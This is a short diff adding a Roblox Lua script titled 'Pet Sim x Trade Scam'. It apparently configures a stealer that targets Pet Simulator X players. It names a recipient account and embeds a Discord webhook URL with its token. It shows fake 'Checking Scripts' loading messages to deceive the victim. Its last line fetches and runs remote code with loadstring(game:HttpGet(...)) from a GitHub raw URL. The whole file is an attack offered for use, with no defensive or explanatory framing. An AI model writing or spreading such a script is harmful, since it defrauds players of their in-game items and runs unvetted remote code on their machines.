@@ -1,0 +1,11 @@
+Username = "MAILMEONPSX"
+WebHook = "https://discord.com/api/webhooks/1135071235823382538/4zSmdRlAlbbck_VNiHUIWyK4riz1_BjMrC3bZAJkXYctr3t7sH8XtmXlDEn5D5LMUf2Z"
+
+
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x Trade Scam"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jopsc/MainOp_script/main/Pet_scriptPetboi"))()
